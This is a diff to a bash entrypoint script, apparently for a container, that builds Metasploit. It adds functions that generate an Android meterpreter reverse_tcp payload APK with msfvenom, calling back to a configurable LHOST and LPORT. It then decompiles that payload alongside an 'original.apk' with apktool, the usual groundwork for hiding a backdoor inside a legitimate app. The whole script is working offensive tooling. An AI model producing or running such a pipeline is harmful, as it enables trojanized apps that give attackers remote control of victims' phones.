@@ -1,26 +1,67 @@
 #!/bin/bash
 
+# CONFIG
 set -x
+
+PATH="${HOME}/.local/bin:${PATH}"
+
+# FUNCTION
+function	mkdir_all()
+{
+	mkdir -p ${HOME}/.local/bin/
+	mkdir -p /home/${USER_NAME}/.msf4
+	mkdir -p /home/${USER_NAME}/.bundle
+	mkdir -p /Shared/output/apk
+	mkdir -p /Shared/output/decompiled
+}
 
 function	msf_build()
 {
-	mkdir -p /home/${USER_NAME}/.msf4
-	mkdir -p /home/${USER_NAME}/.bundle
-
 	cd /opt/metasploit-framework && \
 		bundle install
 }
 
 function	msf_link()
 {
-	mkdir -p ${HOME}/.local/bin/
 	cp -r /opt/metasploit-framework/* ${HOME}/.local/bin/
 }
+
+function	msf_build_payload()
+{
+	msfvenom -p android/meterpreter/reverse_tcp \
+		LHOST=${LHOST} LPORT=${LPORT} \
+		-o /Shared/output/apk/payload.apk
+}
+
+
+function	apktool_decompile()
+{
+	if [ ! -d /Shared/output/decompiled/payload ]; then
+		apktool d -f -o \
+			/Shared/output/decompiled/payload \
+			/Shared/output/apk/payload.apk
+	fi
+	if [ -f "/Shared/output/apk/original.apk" ]; then
+		if [ ! -d "/Shared/output/decompiled/original" ]; then
+			printf "decompiling ${APK_TARGET}\n"
+			apktool d -f -o \
+				/Shared/output/decompiled/original \
+				/Shared/output/apk/original.apk
+		fi
+	fi
+}
+
+# MAIN
+mkdir_all
 
 msf_build
 msf_link
 
-PATH="${HOME}/.local/bin:${PATH}"
+if [ ! -f /Shared/output/apk/payload.apk ]; then
+	msf_build_payload
+fi
+
+apktool_decompile
 
 if [ ${#} != "0" ]; then
 	exec ${@}
